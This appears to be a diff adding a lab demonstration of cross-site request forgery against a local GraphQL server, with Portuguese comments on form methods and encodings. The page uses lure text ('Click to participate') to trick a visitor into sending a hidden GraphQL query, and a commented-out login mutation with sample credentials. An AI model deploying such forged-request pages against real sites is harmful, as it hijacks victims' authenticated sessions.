@@ -1,0 +1,30 @@
+<!--
+Nos formulários HTML temos dois métodos possíveis: POST e GET.
+Sendo POST o mais perigoso para nosso caso.
+
+Temos 3 possíveis "enctype": 
+  application/x-www-form-urlencoded - Encoding, espaços + e especiais usam ASCII HEX 
+  multipart/form-data	- Envia dados com upload de arquivos/ graphql vuneravel
+  text/plain - Envia dados sem encoding
+-->
+
+<div class="container">
+  <h1>Só estamos esperando por você</h1>
+
+  <form
+    method="POST"
+    target="_blank"
+    action="http://localhost:4003/"
+    enctype="multipart/form-data"
+  >
+    <!--   <input type="hidden" value='mutation LOGIN($userName: String!, $password: String! ) { login(data: { userName: $userName password: $password }) { userId token } }' name="query">
+  <input type="hidden" value='{"userName": "helena-maria", "password": "Abc123"}' name="variables"> -->
+
+    <input
+      type="hidden"
+      value="query GET_POSTS { posts { id } }"
+      name="query"
+    />
+    <button type="submit">Clique para participar</button>
+  </form>
+</div>
